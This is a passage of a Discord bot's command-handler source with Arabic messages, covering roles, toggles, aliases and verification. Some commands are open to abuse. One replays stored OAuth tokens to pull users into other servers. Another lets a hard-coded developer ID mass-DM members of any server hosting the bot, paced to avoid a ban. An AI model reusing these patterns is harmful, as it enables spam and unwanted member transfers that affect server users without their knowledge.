        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const maxRole = interaction.options.getRole("max-role");
        const baseRole = interaction.options.getRole("base-role");
        const excludedRolesStr = interaction.options.getString("excluded-roles");
        if (maxRole) {
          db.prepare("INSERT INTO bonus_role_settings (guildId, maxRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET maxRoleId = excluded.maxRoleId").run(guildId, maxRole.id);
        }
        if (baseRole) {
          db.prepare("INSERT INTO bonus_role_settings (guildId, baseRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET baseRoleId = excluded.baseRoleId").run(guildId, baseRole.id);
        }
        if (excludedRolesStr !== null) {
          const ids = excludedRolesStr.split(/[\s,]+/).filter((id) => id.length > 10).join(",");
          db.prepare("INSERT INTO bonus_role_settings (guildId, excludedRoleIds) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET excludedRoleIds = excluded.excludedRoleIds").run(guildId, ids);
        }
        await interaction.reply("\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0628\u0627\u0644\u0628\u0648\u0646\u064A\u0633 \u0628\u0646\u062C\u0627\u062D. \u0633\u064A\u0642\u0648\u0645 \u0627\u0644\u0646\u0638\u0627\u0645 \u0627\u0644\u0622\u0646 \u0628\u062A\u062D\u062F\u064A\u062F \u0627\u0644\u0631\u062A\u0628 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B \u0628\u064A\u0646 \u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0623\u0633\u0627\u0633\u064A\u0629 \u0648\u0627\u0644\u0633\u0642\u0641.");
      }
      if (commandName === "auto-role-add") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        db.prepare("INSERT OR REPLACE INTO auto_roles (guildId, roleId) VALUES (?, ?)").run(guildId, role.id);
        await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 \u0627\u0644\u0631\u062A\u0628\u0629 ${role} \u0625\u0644\u0649 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629. \u062C\u0627\u0631\u064A \u062A\u0648\u0632\u064A\u0639 \u0627\u0644\u0631\u062A\u0628\u0629 \u0639\u0644\u0649 \u062C\u0645\u064A\u0639 \u0627\u0644\u0623\u0639\u0636\u0627\u0621...`);
        const guild2 = interaction.guild;
        guild2.members.fetch().then(async (members) => {
          let count = 0;
          for (const member of members.values()) {
            if (!member.roles.cache.has(role.id)) {
              await member.roles.add(role.id).catch(() => {
              });
              count++;
            }
          }
          await interaction.followUp(`\u2705 \u062A\u0645 \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621 \u0645\u0646 \u062A\u0648\u0632\u064A\u0639 \u0627\u0644\u0631\u062A\u0628\u0629 \u0639\u0644\u0649 **${count}** \u0639\u0636\u0648.`);
        }).catch((err) => {
          console.error("Failed to fetch members for auto-role-add:", err);
          interaction.followUp("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0645\u062D\u0627\u0648\u0644\u0629 \u062A\u0648\u0632\u064A\u0639 \u0627\u0644\u0631\u062A\u0628\u0629 \u0639\u0644\u0649 \u062C\u0645\u064A\u0639 \u0627\u0644\u0623\u0639\u0636\u0627\u0621.").catch(() => {
          });
        });
      }
      if (commandName === "auto-role-remove") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        const result = db.prepare("DELETE FROM auto_roles WHERE guildId = ? AND roleId = ?").run(guildId, role.id);
        if (result.changes > 0) {
          await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u0631\u062A\u0628\u0629 ${role} \u0645\u0646 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629.`);
        } else {
          await interaction.reply({ content: "\u274C \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u064A\u0633\u062A \u0641\u064A \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629.", ephemeral: true });
        }
      }
      if (commandName === "auto-role-list") {
        const roles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guildId);
        if (roles.length === 0) {
          return interaction.reply({ content: "\u0644\u0627 \u062A\u0648\u062C\u062F \u0631\u062A\u0628 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0645\u0636\u0627\u0641\u0629 \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
        }
        const list = roles.map((r) => `<@&${r.roleId}>`).join("\n");
        const embed = new EmbedBuilder().setTitle("\u{1F4CB} \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629").setDescription(list).setColor(5793266);
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "disable") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const feature = interaction.options.getString("feature");
        if (feature === "leveling") {
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
        } else if (feature === "welcome") {
          db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
        } else if (feature === "protection") {
          db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, 0, 0, 0) ON CONFLICT(guildId) DO UPDATE SET antiLink = 0, antiSpam = 0, antiRaid = 0").run(guildId);
        }
        await interaction.reply(`\u2705 \u062A\u0645 \u062A\u0639\u0637\u064A\u0644 ${feature} \u0628\u0646\u062C\u0627\u062D.`);
      }
      if (commandName === "toggle") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const feature = interaction.options.getString("feature");
        const status = interaction.options.getString("status");
        const enabled = status === "on" ? 1 : 0;
        if (feature === "leveling") {
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        } else if (feature === "welcome") {
          db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        } else if (feature === "protection") {
          db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET antiLink = excluded.antiLink, antiSpam = excluded.antiSpam, antiRaid = excluded.antiRaid").run(guildId, enabled, enabled, enabled);
        }
        await interaction.reply(`\u2705 \u062A\u0645 ${status === "on" ? "\u062A\u0641\u0639\u064A\u0644" : "\u062A\u0639\u0637\u064A\u0644"} ${feature} \u0628\u0646\u062C\u0627\u062D.`);
      }
      if (commandName === "set-alias") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const aliasName = interaction.options.getString("alias").toLowerCase();
        const originalCommand = interaction.options.getString("command").toLowerCase();
        await interaction.deferReply({ ephemeral: true }).catch(() => {
        });
        db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)").run(guildId, aliasName, originalCommand);
        try {
          const commands = await client.application?.commands.fetch();
          const original = commands?.find((c) => c.name === originalCommand);
          if (original) {
            await guild.commands.create({
              name: aliasName,
              description: `Shortcut for /${originalCommand}`,
              options: original.options
            });
            await interaction.editReply(`\u2705 Alias created: **${aliasName}** now triggers **${originalCommand}**.`);
          } else {
            await interaction.editReply({ content: `\u274C Original command **${originalCommand}** not found.` });
          }
        } catch (err) {
          console.error("Failed to register alias command:", err);
          await interaction.editReply({ content: "\u2705 Alias saved to DB, but failed to register slash command locally." });
        }
      }
      if (commandName === "remove-alias") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const aliasName = interaction.options.getString("alias").toLowerCase();
        await interaction.deferReply({ ephemeral: true }).catch(() => {
        });
        db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
        try {
          const guildCommands = await guild.commands.fetch();
          const cmd = guildCommands.find((c) => c.name === aliasName);
          if (cmd) await cmd.delete();
          await interaction.editReply(`\u2705 Alias **${aliasName}** removed.`);
        } catch (err) {
          await interaction.editReply(`\u2705 Alias removed from DB.`);
        }
      }
      if (commandName === "set-avatar") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const url = interaction.options.getString("url");
        await interaction.deferReply({ ephemeral: true }).catch(() => {
        });
        try {
          await client.user?.setAvatar(url);
          await interaction.editReply("\u2705 Bot avatar updated successfully!");
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "\u274C Failed to update avatar. Make sure the URL is valid and the image is not too large." });
        }
      }
      if (commandName === "promote-owner") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        if (interaction.user.id !== guild.ownerId) {
          return interaction.reply({ content: "Only the server owner can use this command.", ephemeral: true });
        }
        const targetMember = interaction.options.getMember("user");
        if (!targetMember) return interaction.reply({ content: "User not found.", ephemeral: true });
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' (Manage Roles).", ephemeral: true });
        }
        await interaction.deferReply({ ephemeral: true }).catch(() => {
        });
        try {
          let ownerRole = guild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await guild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Manual promotion by ${user.tag}`
            });
          }
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            if (err.code === 50013) console.warn(`[PROMOTE] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }
          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole);
            await interaction.editReply(`\u2705 Successfully promoted ${targetMember.user.tag} to Owner.`);
          } else {
            await interaction.editReply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0644\u0644\u0628\u0648\u062A \u0625\u0639\u0637\u0627\u0621 \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u0623\u0646\u0647\u0627 \u0623\u0639\u0644\u0649 \u0645\u0646 \u0631\u062A\u0628\u062A\u0647 \u0641\u064A \u0627\u0644\u0642\u0627\u0626\u0645\u0629." });
          }
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "\u274C Failed to promote user. Check my permissions and role hierarchy." });
        }
      }
      if (commandName === "accept") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0642\u0628\u0648\u0644 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const targetMember = interaction.options.getMember("user");
        if (!targetMember) return interaction.reply({ content: "User not found.", ephemeral: true });
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' (Manage Roles).", ephemeral: true });
        }
        await interaction.deferReply({ ephemeral: true }).catch(() => {
        });
        try {
          let ownerRole = guild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await guild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Accepted by ${user.tag}`
            });
          }
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            if (err.code === 50013) console.warn(`[ACCEPT] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }
          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole);
            await interaction.editReply(`\u2705 \u062A\u0645 \u0642\u0628\u0648\u0644 ${targetMember.user.tag} \u0648\u0625\u0639\u0637\u0627\u0624\u0647 \u0631\u062A\u0628\u0629 Owner.`);
          } else {
            await interaction.editReply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0644\u0644\u0628\u0648\u062A \u0625\u0639\u0637\u0627\u0621 \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u0623\u0646\u0647\u0627 \u0623\u0639\u0644\u0649 \u0645\u0646 \u0631\u062A\u0628\u062A\u0647 \u0641\u064A \u0627\u0644\u0642\u0627\u0626\u0645\u0629." });
          }
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "\u274C \u0641\u0634\u0644 \u0642\u0628\u0648\u0644 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645. \u062A\u0623\u0643\u062F \u0645\u0646 \u0635\u0644\u0627\u062D\u064A\u0627\u062A\u064A \u0648\u0645\u0648\u0642\u0639 \u0631\u062A\u0628\u062A\u064A." });
        }
      }
      if (commandName === "transfer") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u062A\u062D\u0642\u0642 (\u0646\u0642\u0644 \u0627\u0644\u0623\u0639\u0636\u0627\u0621) \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const sourceGuildId = interaction.options.getString("from_server_id");
        const targetGuildId = interaction.options.getString("to_server_id") || guild.id;
        if (sourceGuildId === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0646\u0642\u0644 \u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A \u0645\u0646 \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0645\u0648\u062C\u0648\u062F\u0627\u064B \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641 (${targetGuildId}).`, ephemeral: true });
        }
        const tokens = db.prepare("SELECT * FROM tokens WHERE guildId = ?").all(sourceGuildId);
        if (tokens.length === 0) {
          return interaction.reply({ content: `\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u062A\u0648\u0643\u0646\u0627\u062A \u0645\u0633\u062C\u0644\u0629 \u0644\u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 (${sourceGuildId}).`, ephemeral: true });
        }
        await interaction.deferReply();
        const targetName = targetGuild.name;
        await interaction.editReply(`\u23F3 \u062C\u0627\u0631\u064A \u0628\u062F\u0621 \u0646\u0642\u0644 **${tokens.length}** \u0639\u0636\u0648 \u0625\u0644\u0649 \u0633\u064A\u0631\u0641\u0631 **${targetName}**...`);
        let success = 0;
        let failed = 0;
        for (const tokenData of tokens) {
          try {
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ? AND guildId = ?").run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1e3, tokenData.userId, sourceGuildId);
              } else {
                failed++;
                continue;
              }
            }
            const response = await axios.put(
              `https://discord.com/api/guilds/${targetGuildId}/members/${tokenData.userId}`,
              { access_token: accessToken },
              { headers: { Authorization: `Bot ${DISCORD_TOKEN}`, "Content-Type": "application/json" } }
            );
            if (response.status === 201 || response.status === 204) {
              success++;
            } else {
              failed++;
            }
          } catch (err) {
            failed++;
          }
          await new Promise((resolve) => setTimeout(resolve, 500));
        }
        await interaction.followUp(`\u2705 \u0627\u0643\u062A\u0645\u0644\u062A \u0627\u0644\u0639\u0645\u0644\u064A\u0629!
- \u062A\u0645 \u0628\u0646\u062C\u0627\u062D: **${success}**
- \u0641\u0634\u0644: **${failed}**
- \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641: **${targetName}**`);
      }
      if (commandName === "setup-verify") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        if (!guild.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A' \u0623\u0648 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' \u0644\u062A\u0646\u0641\u064A\u0630 \u0647\u0630\u0627 \u0627\u0644\u0625\u062C\u0631\u0627\u0621.", ephemeral: true });
        }
        db.prepare("INSERT INTO protection_settings (guildId, verifiedRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET verifiedRoleId = excluded.verifiedRoleId").run(guild.id, role.id);
        await interaction.reply({ content: "\u23F3 \u062C\u0627\u0631\u064A \u0636\u0628\u0637 \u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B... \u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631.", ephemeral: true });
        const channels = await guild.channels.fetch();
        let successCount = 0;
        let failCount = 0;
        const protection = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(guild.id);
        const logChannelId = protection?.logChannel;
        for (const [id, channel2] of channels) {
          if (!channel2) continue;
          try {
            const channelName = channel2.name.toLowerCase();
            const isPrivate = channelName.includes("log") || channelName.includes("admin") || channelName.includes("staff") || channelName.includes("mod") || channelName.includes("private") || id === logChannelId;
            if (id === interaction.channelId) {
              await channel2.permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: true });
              await channel2.permissionOverwrites.edit(role.id, { ViewChannel: true });
            } else if (isPrivate) {
              await channel2.permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: false });
              await channel2.permissionOverwrites.edit(role.id, { ViewChannel: false });
            } else {
              await channel2.permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: false });
              await channel2.permissionOverwrites.edit(role.id, { ViewChannel: true });
            }
            successCount++;
          } catch (err) {
            failCount++;
          }
        }
        const embed = new EmbedBuilder().setTitle("\u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u0627\u0644\u0639\u0636\u0648\u064A\u0629").setDescription("\u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u062D\u0633\u0627\u0628\u0643 \u0648\u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0627\u0644\u0631\u062A\u0628.").setColor(5793266);
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("verify_member").setLabel("\u062A\u062D\u0642\u0642 \u0627\u0644\u0622\u0646").setStyle(ButtonStyle.Primary).setEmoji("\u2705")
        );
        const botMember = guild.members.me;
        if (!botMember?.permissionsIn(interaction.channelId).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
          return interaction.followUp({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0623\u0648 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0631\u0648\u0645.", ephemeral: true });
        }
        await interaction.channel?.send({ embeds: [embed], components: [row] });
        return interaction.followUp({ content: `\u2705 \u062A\u0645 \u0625\u0639\u062F\u0627\u062F \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u062D\u0642\u0642 \u0628\u0646\u062C\u0627\u062D!
- \u0627\u0644\u0631\u062A\u0628\u0629: **${role.name}**
- \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u062A\u0645 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${successCount}**
- \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u0641\u0634\u0644 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${failCount}**`, ephemeral: true });
      }
      if (commandName === "broadcast") {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }
        const targetGuildId = interaction.options.getString("server_id");
        const broadcastMessage = interaction.options.getString("message");
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0639\u0636\u0648\u0627\u064B \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 (${targetGuildId}).`, ephemeral: true });
        }
        const targetBotMember = targetGuild.members.me;
        if (!targetBotMember?.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 'Administrator' \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641: **${targetGuild.name}**.`, ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply(`\u23F3 \u062C\u0627\u0631\u064A \u0628\u062F\u0621 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0625\u0644\u0649 \u0623\u0639\u0636\u0627\u0621 \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**... (\u0642\u062F \u064A\u0633\u062A\u063A\u0631\u0642 \u0627\u0644\u0623\u0645\u0631 \u0648\u0642\u062A\u0627\u064B \u0637\u0648\u064A\u0644\u0627\u064B \u0644\u062A\u062C\u0646\u0628 \u0627\u0644\u062D\u0638\u0631)`);
        try {
          console.log(`[BROADCAST] Starting broadcast for guild: ${targetGuild.name} (${targetGuild.id})`);
          let members;
          try {
            console.log(`[BROADCAST] Attempting to fetch members for ${targetGuild.name}...`);
            members = await targetGuild.members.fetch({ withPresences: false, time: 6e4 }).catch((err) => {
              if (err.code === 50013) {
                console.warn(`[BROADCAST] Missing Permissions to fetch members for ${targetGuild.name}`);
              } else {
                console.warn(`[BROADCAST] Member fetch failed for ${targetGuild.name}: ${err.message}. Using cache.`);
              }
              return targetGuild.members.cache;
            });
          } catch (err) {
            console.error(`[BROADCAST] Critical error during fetch for ${targetGuild.name}:`, err);
            members = targetGuild.members.cache;
          }
          if (!members || members.size === 0) {
            console.warn(`[BROADCAST] No members found for ${targetGuild.name} (Cache size: ${targetGuild.members.cache.size})`);
            return interaction.followUp("\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0623\u0639\u0636\u0627\u0621 \u0644\u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0625\u0644\u064A\u0647\u0645. \u062A\u0623\u0643\u062F \u0645\u0646 \u062A\u0641\u0639\u064A\u0644 'Server Members Intent' \u0641\u064A Discord Developer Portal.");
          }
          console.log(`[BROADCAST] Found ${members.size} members. Starting DM loop...`);
          let successCount = 0;
          let failCount = 0;
          for (const [id, member] of members) {
            if (member.user.bot) continue;
            try {
              await member.send(broadcastMessage);
              successCount++;
              if (successCount % 5 === 0) console.log(`[BROADCAST] Successfully sent ${successCount} messages...`);
            } catch (err) {
              failCount++;
              if (err instanceof Error && !err.message.includes("Cannot send messages to this user")) {
                console.error(`[BROADCAST] Failed to send DM to ${member.user.tag}:`, err.message);
              }
            }
            await new Promise((resolve) => setTimeout(resolve, 3e3));
          }
          console.log(`[BROADCAST] Completed. Success: ${successCount}, Failed: ${failCount}`);
          await interaction.followUp(`\u2705 \u0627\u0643\u062A\u0645\u0644 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A!
- \u062A\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${successCount}**
- \u0641\u0634\u0644 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${failCount}** (\u063A\u0627\u0644\u0628\u0627\u064B \u0628\u0633\u0628\u0628 \u0625\u063A\u0644\u0627\u0642 \u0627\u0644\u062E\u0627\u0635)`);
        } catch (err) {
          console.error("Broadcast error:", err);
          await interaction.followUp("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u062C\u0644\u0628 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 \u0623\u0648 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644.");
        }
      }
      if (commandName === "broadcast-here") {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }
        const broadcastMessage = interaction.options.getString("message");
        const targetGuild = interaction.guild;
        if (!targetGuild) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u064A\u0639\u0645\u0644 \u0641\u0642\u0637 \u062F\u0627\u062E\u0644 \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A.", ephemeral: true });
        }
        const targetBotMember = targetGuild.members.me;
        if (!targetBotMember?.permissions.has(PermissionFlagsBits.Administrator)) {
